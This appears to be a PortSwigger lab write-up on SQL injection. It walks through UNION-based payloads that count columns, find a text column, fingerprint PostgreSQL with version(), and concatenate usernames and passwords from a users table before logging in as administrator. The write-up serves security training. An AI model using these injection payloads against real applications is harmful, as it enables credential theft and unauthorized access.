## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/bb62cddb-eff4-4e33-82b7-2a457ab0d128)

## Solution :
Query made -- 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Finding out the number of columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
```

**2 NULL** returns no error , which means there are 2 columns in the database.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b8bc92f3-9631-468d-ada3-544e50f640b4)

####  Finding out which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'd',NULL --
```

Internal Server Error

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/49e9d2cc-5f43-4353-8d6f-9fe917ead767)


**2nd Column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'d' --
```
This column contains text data .

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d41987fb-4556-4e51-b0d4-4169caa0de96)

### we need find out which version it is  using then only we will be able to concatination string.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/14787ad8-8495-41af-89b1-f177cc665402)

#### For determine the type of database.

The type of database in the second column can be identified by using the version command of each respective database system.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b9586d00-7085-4324-9de1-80be4f197a86)

**Here it is PostgreSQL**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/09240204-6870-4a57-873f-344a3e03a716)

it is using POSTgreSQL 

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/3917cbc6-e246-441a-8e09-c30a21a8bba7)

#### Retreive multiple values in single column -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/84b1aa94-4221-4f9b-8b85-6070682d97b4)


got all the users and password.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c9ad0fa4-f555-43a4-ba11-ff73b8193213)

Successfully logged in as administrator

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/13c81631-4528-4bde-bbbd-45e22111f65f)












